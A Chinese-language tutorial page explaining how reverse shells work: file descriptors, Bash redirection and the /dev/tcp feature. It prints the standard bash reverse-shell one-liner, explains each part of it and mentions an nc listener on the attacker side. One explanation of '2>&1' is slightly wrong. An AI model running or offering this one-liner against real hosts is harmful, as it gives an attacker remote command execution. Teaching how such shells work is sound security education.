---
title: "反弹shell" 
weight: 3
bookToc: true
---

## 背景

当攻击进入目标主机之后，希望获取目标主机的一个shell，用于执行各种命令。如果采用bind shell（正向），可能会面临很多问题：
- 防火墙的阻断
- 被控端ip动态变化，无固定ip
- 被控端为局域网主机，无外网ip

![alt text](/data/image/security/rshell/image.png)

reverse shell（反向）：
- 控制端监听在某TCP/UDP端口，**被控制端主动连接**控制端的这一端口
- 实现原理：将被控端的shell输入输出，重定向到攻击者的主机
- 相比本地化shell更具有实用价值，攻击者可以实现远程持久化

![alt text](/data/image/security/rshell/image-1.png)

## 文件描述符和标准I/O

- fd 0：标准输入 / fd 1：标准输出 / fd 2：标准错误
- `echo $$` 命令获取当前 shell 进程的PID
- `/proc/xxx` 为内核提供的接口，用于让用户查看一些内核的参数，系统会为每一个运行的进程创建一个以其 PID 命名的目录
- 在每个进程的目录下，fd 子目录包含了该进程打开的所有文件描述符的链接
- 文件描述符会从父进程继承
- `/dev/pts/0`：可以理解为打开的终端的本身，0为编号，表示第一个终端，负责输入输出显示

![alt text](/data/image/security/rshell/image-2.png)

---

- `cat > /tmp/test`：从标准输入读取内容，并将其写入（覆盖）到 /tmp/test 这个文件中
- `pstree -p`：以树状结构的形式显示当前系统中正在运行的进程之间的父子关系，并显示PID

重定向前：
![alt text](/data/image/security/rshell/image-4.png)

重定向后：
![alt text](/data/image/security/rshell/image-3.png)

---

重定向符号`<>`：
- `>`：以写方式打开，并把指定 fd（默认对应 fd 1）连接到该文件
- `<`：以读方式打开，并把指定 fd（默认对应 fd 0）连接到该文件

如 `cat >/tmp/xyz` 等于 `cat 1>/tmp/xyz`

![alt text](/data/image/security/rshell/image-5.png)

> 注意观察 3 4 5 对应的读写权限

可以重定向到文件，也可以重定向到其他文件描述符，使用>&, <&符号

- `exec 3< /etc/passwd` 将/etc/passwd内容拷贝到fd 3
- `cat <& 3` 是将fd 3的内容作为cat的输入

![alt text](/data/image/security/rshell/image-6.png)

{{< hint info >}}
关于`exec`
`exec ls`不是 shell 启动一个子进程去运行 ls，而是当前 shell 进程本身，直接变成了 ls 进程；同时，exec可以只修改当前 shell 的文件描述符 `exec 3> /tmp/xyz`
{{< /hint >}}

## shell

Shell 是命令解释器，是用户与操作系统之间的一层接口。它负责读取输入、解析输入、执行命令，并输出结果。

例如你在终端中输入：
```
ls -l /tmp
```

其执行过程可以理解为：
1. 终端将用户输入的字符传递给 shell 的标准输入
2. shell 读取并解析这行输入
- 命令名：ls
- 参数：-l、/tmp
3. shell 执行该命令
- 如果是外部命令，通常通过 fork 创建子进程，再由子进程 exec 对应程序
- 如果是内建命令（如cd），则由 shell 自身直接执行
4. 命令的执行结果写入标准输出或标准错误
5. 终端接收这些输出并显示给用户
6. 在交互式 shell 中，标准输入、标准输出和标准错误通常都连接到终端

## reverse shell 原理

进程先调用系统调用创建 socket，再通过 `connect / listen / accept` 建立连接关系，连接建立后，两端各自有与该连接相关联的 socket；
进程会持有指向该 socket 的文件描述符（fd），随后通过对 fd 的读写完成网络数据的发送与接收。

**我们可以把 shell 的标准输入、标准输出、标准错误重定向到一个 TCP 连接对应的 socket 所关联的文件描述符上；这样 shell 就能通过这个网络连接收发命令与结果，这就是反向 shell 的核心原理。**

`/dev/tcp/192.168.145.129/9090`：不是磁盘上的设备文件，不存在于 /dev/ 目录，是 Bash 的内置功能，当 Bash 看到 `/dev/tcp/主机/端口` 时，会尝试建立 TCP 连接

A主机：将标准输出重定向一个TCP连接，相当于通过TCP发送hello
![alt text](/data/image/security/rshell/image-7.png)

B主机：接收到hello
![alt text](/data/image/security/rshell/image-8.png)

---

**reverse shell常用命令：启动一个交互式 bash，并把这个 bash 的标准输出、输入、错误都接到一个 TCP 连接上**
```
/bin/bash -i >/dev/tcp/[server ip]/[server port] 0<&1 2>&1
```

![alt text](/data/image/security/rshell/image-9.png)


- `>/dev/tcp/[server ip]/[server port]` 建立到目标主机端口的 TCP 连接，并把标准输出 fd 1 重定向TCP链接，相当于输出会发送到网络中
- `0<&1` 让 fd 0 指向 fd 1，即把 标准输入 定向到当前 标准输出 fd 1 所连接的地方，当前 fd 1 已经连到上面的 TCP socket 了
- `2>&1` 让 fd 0 指向 fd 1，即把 标准错误 也指向和 标准输出 fd1 相同的地方，当前 fd 1 已经连到上面的 TCP socket 了
- 所以这个命令的顺序也很重要


{{< hint info >}}
注意：

需由 /bin/bash 打开 /dev/tcp，依赖的是 Bash 的 `/dev/tcp/host/port` 特性；使用其他shell可能需要更换写法。

攻击者端常用 nc -l 监听端口：
- 攻击者端的 nc 会把从网络收到的数据（这里对应受害者shell的标准输出），直接写到攻击者端的标准输出，；
- 也会把自己标准输入，也就是当前终端屏幕上读到的内容，通过 TCP 连接发给远端（这里对应受害者shell的标注输入，当作命令来读和执行）。
{{< /hint >}}

适用场景：
- 外网主机无法访问内网主机，而内网主机能够访问外网主机
- 在外网主机上监听，内网主机发起反向Shell，可实现内网穿透